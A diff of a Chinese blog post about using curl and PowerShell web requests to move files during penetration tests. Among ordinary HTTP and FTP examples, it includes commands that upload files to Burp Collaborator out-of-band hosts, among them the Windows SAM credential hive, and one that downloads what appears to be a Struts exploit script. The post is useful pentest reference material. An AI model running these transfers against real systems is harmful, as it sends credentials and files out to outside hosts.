@@ -1,40 +1,38 @@
 ---
-title: "curl详解"  # 文章标题
-date: 2018-07-15T14:30:00+08:00  # 文章创建日期
-draft: false  # 是否为草稿，true 表示草稿，不会在网站上显示
-author: "runshell"  # 文章作者
-description: "介绍Linux curl命令用法和Windows服务器powershell实现类似功能的方法"  # 文章描述
-tags: ["curl"]  # 文章标签
-categories: ["网络安全"]  # 文章分类
+title: "curl详解" # 文章标题
+date: 2018-07-15T14:30:00+08:00 # 文章创建日期
+draft: false # 是否为草稿，true 表示草稿，不会在网站上显示
+author: "runshell" # 文章作者
+description: "介绍Linux curl命令用法和Windows服务器powershell实现类似功能的方法" # 文章描述
+tags: ["curl"] # 文章标签
+categories: ["网络安全"] # 文章分类
 ---
-
-
 
 ## 0x00 前言
 
-在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——`Invoke-WebRequest`，其别名之一是curl。所以，简单记录一下curl的用法。
+在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl 是一个非常厉害的工具，在绝大多数情况下，linux 系统中是存在 curl 的。此外 Windows 系统中，powershell4.0 及其以后的版本中提供了一个 cmlet——`Invoke-WebRequest`，其别名之一是 curl。所以，简单介绍一下 curl 的用法。
 
-## 0x01 Linux中的curl
+## 0x01 Linux 中的 curl
 
-### 1.http请求
+### 1.http 请求
 
-* **get**
+- **get**
 
-curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。
+curl 命令后面直接跟 url；使用-H 指定请求头，每个-H 指定一条 header；使用 -o 指定输出到具体文件而不是标准输出。
 
 ```bash
-curl 'https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Referer: https://admin.college.360.cn/user/student/course/1032'
+curl 'https://files.xx.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Referer: https://admin.xx.cn/user/student/course/1032'
 ```
 
-* **post**
+- **post**
 
-普通表单post，使用-d指定请求体内容。
+普通表单 post，使用-d 指定请求体内容。
 
 ```bash
 curl -d "user=admin&passwd=12345678" http://127.0.0.1:8080/login
 ```
 
-文件表单post，使用-F指定需要上传的文件。
+文件表单 post，使用-F 指定需要上传的文件。
 
 ```bash
 curl http://oumchi.burpcollaborator.net -F "6379.txt=@6379.txt"
@@ -65,13 +63,13 @@ curl http://oumchi.burpcollaborator.net -F "6379.txt=@6379.txt"
 
 ```
 
-* put
+- put
 
 ```bash
 curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
 ```
 
-* 其它方法测试
+- 其它方法测试
 
 ```bash
 curl http://www.example.com -X OPTIONS
@@ -79,27 +77,27 @@ curl http://www.example.com -X TRACE
 ...
 ```
 
-### 2.ftp请求
+### 2.ftp 请求
 
-* **get**
+- **get**
 
 ```bash
 curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
 ```
 
-* **put**
+- **put**
 
 ```bash
 curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
 ```
 
-* **ls(dir)**
+- **ls(dir)**
 
 ```bash
 curl ftp://user:passwd@ftpserver.com:port/path/
 ```
 
-* **delete**
+- **delete**
 
 ```bash
 curl –u name:passwd ftp://www.xxx.com/ -X 'DELE mp3/size.mp3'
@@ -107,26 +105,22 @@ curl –u name:passwd ftp://www.xxx.com/ -X 'DELE mp3/size.mp3'
 
 ### 3.其他
 
-```ba&#39;sh
+```ba'sh
 -u, --user <user:password> 需要口令验证的http或ftp
 --ntlm 使用htlm认证
 -A, --user-agent <name> 指定请求头中的user-agent字段
 --socks5 <host[:port]> 使用sockes5代理
 -x, --proxy [protocol://]host[:port] 使用http/https代理
- 
+
 --post301       Do not switch to GET after following a 301 不跳转301
 --post302       Do not switch to GET after following a 302 不跳转302
 --post303       Do not switch to GET after following a 303 不跳转303
 
 ```
 
+## 0x02 Windows 中的 curl
 
-
-
-
-## 0x02 Windows中的curl
-
-powershell 中的curl是`Invoke-WebRequest`，它的另一个别名是wget。它是使用`-Headers <IDictionary>`来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过`-UserAgent <String>`指定。
+powershell 中的 curl 是`Invoke-WebRequest`，它的另一个别名是 wget。它是使用`-Headers <IDictionary>`来指定请求头，powershell5.x 即以前版本可以指定所有请求头，之后的版本 UserAgent 只能通过`-UserAgent <String>`指定。
 
 ```powershell
 Invoke-WebRequest [-Uri] <Uri> [-Body <Object>] [-Certificate <X509Certificate>] [-CertificateThumbprint <String>] [-ContentType <String>] [-Credential <PSCredential>
@@ -138,25 +132,25 @@ Invoke-WebRequest [-Uri] <Uri> [-Body <Object>] [-Certificate <X509Certificate>]
 
 ### 1.http
 
-* **get**
+- **get**
 
-使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给`write-host`,如`curl ifconfig.me | write-host` 。
-
-```powershell
-Invoke-WebRequest -Uri "https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc" -Headers @{"Accept"="*/*"; "Referer"="https://admin.college.360.cn"} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" -OutFile xxx.pdf
-```
-
-* **post**
-
-在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。
+使用-UserAgent 指定 UA，使用-Headers 指定请求头，使用-OutFile 指定输出到文件。若不使用-OutFile，将返回一个 HtmlWebResponseObject 对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量 content 等属性。若只想产看响应体，可用管道符传给`write-host`,如`curl ifconfig.me | write-host` 。
 
 ```powershell
-curl http://lti9gf.burpcollaborator.net -Method post -Body "user=admin&passwd=12345678" 
+Invoke-WebRequest -Uri "https://files.xx.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc" -Headers @{"Accept"="*/*"; "Referer"="https://admin.xx.cn"} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" -OutFile xxx.pdf
 ```
 
-* **put**
+- **post**
 
-如果服务器支持put方法，可以直接put上传文件
+在使用非 get 方法时必须用-Method 指定请求方法；请求体可以用-body 指定一个 string 或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile 指定本地文件。
+
+```powershell
+curl http://lti9gf.burpcollaborator.net -Method post -Body "user=admin&passwd=12345678"
+```
+
+- **put**
+
+如果服务器支持 put 方法，可以直接 put 上传文件
 
 ```powershell
 curl http://lti9gf.burpcollaborator.net -Method put -InFile ‪C:\sam.hive
@@ -172,7 +166,7 @@ curl ftp://user:password@127.0.0.1:21/s2-057.py -outFile s2-057.py
 
 ## 0x03 net.webclient
 
-在powershell4.0以前没有提供`Invoke-WebRequest`,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。
+在 powershell4.0 以前没有提供`Invoke-WebRequest`,这时我们可以使用 Net.WebClient，它是.NET Framework 中的一个类。它的功能更加强大。
 
 ```powershell
 #ftp下载
